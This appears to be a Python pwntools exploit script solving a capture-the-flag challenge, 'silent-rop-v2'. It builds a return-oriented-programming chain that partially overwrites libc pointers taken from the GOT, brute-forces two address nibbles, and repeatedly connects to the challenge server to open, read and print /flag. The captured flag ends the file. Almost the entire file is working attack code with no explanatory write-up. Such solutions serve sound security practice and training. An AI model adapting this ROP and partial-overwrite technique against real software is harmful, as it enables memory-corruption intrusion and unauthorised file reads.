from pwn import *
import time

bin = './chal'
elf = context.binary = ELF(bin)

rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]
pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]
flag_file = 0x404500 
open_buff = 0x404550
write_buff = 0x404575
flag_buffer = 0x404450

#0x00000000004011e9 : mov rdi, qword ptr [rdx] ; ret
mov_rdi_rdx = 0x4011e9 #can use this to put a libc address at rdx
#0x00000000004011ed : mov qword ptr [rdx + rsi], rdi ; ret
mov_rdxrsi_rdi = 0x4011ed
#0x00000000004011fa : mov qword ptr [rsp + rdx], rdi ; ret
mov_rsprdx_rdi = 0x4011fa


payload = b'A'*24
#Reading in /flag
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(flag_file) + p64(0)
payload += p64(pop_rdx) + p64(5)
payload += p64(elf.plt['read'])

#Putting a libc address in memory
payload += p64(pop_rdx) + p64(elf.got['read'])
payload += p64(mov_rdi_rdx)
payload += p64(pop_rdx) + p64(open_buff)
payload += p64(pop_rsi) + p64(0) + p64(0)
payload += p64(mov_rdxrsi_rdi)

#Putting it again so we can make it write
payload += p64(pop_rdx) + p64(elf.got['read'])
payload += p64(mov_rdi_rdx)
payload += p64(pop_rdx) + p64(write_buff)
payload += p64(pop_rsi) + p64(0) + p64(0)
payload += p64(mov_rdxrsi_rdi)

#Overwrite the nibbles
#brute forcing the middle 2 nibs
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(open_buff) + p64(0)
payload += p64(pop_rdx) + p64(2)
payload += p64(elf.plt['read'])

#Overwrite the nibbles
#brute forcing the middle 2 nibs
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(write_buff) + p64(0)
payload += p64(pop_rdx) + p64(2)
payload += p64(elf.plt['read'])

#Putting open onto the stack
payload += p64(pop_rdx) + p64(open_buff)
payload += p64(mov_rdi_rdx)
payload += p64(pop_rdx) + p64(8*7)
payload += p64(mov_rsprdx_rdi)
payload += p64(pop_rdi) + p64(flag_file)
payload += p64(pop_rdx) + p64(644)
payload += p64(pop_rsi) + p64(0) + p64(0)
payload += p64(0)


#Reading from file to buffer
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi) + p64(flag_buffer) + p64(0)
payload += p64(pop_rdx) + p64(0xff)
payload += p64(elf.plt['read'])


#Putting write onto the stack
payload += p64(pop_rdx) + p64(write_buff)
payload += p64(mov_rdi_rdx)
payload += p64(pop_rdx) + p64(8*7)
payload += p64(mov_rsprdx_rdi)
payload += p64(pop_rdi) + p64(2)
payload += p64(pop_rdx) + p64(0xff)
payload += p64(pop_rsi) + p64(flag_buffer) + p64(0)
payload += p64(0)
payload += b'AAAAAAAA' #segfault to get EOF

for i in range(8**2):
    #p = process(bin)
    p = remote('silent-rop-v2.challs.csc.tf', 1337)
    #gdb.attach(p, 'b open')
    #pause()

    p.sendline(payload)
    time.sleep(.2)
    p.send(b'/flag')
    time.sleep(.2)
    p.send(b'\x00\x2f') #0x2f00
    time.sleep(.2)
    p.send(b'\x80\x32') #0x3280
    
    #p.interactive()
    print(p.recvall())
    p.close()

#CSCTF{Full_R3lR0_c4Nt_st0p_uS_Fr0m_DL_r3S0lv1nG_h9348fj3984fj439fij34i34jf93fj034ff}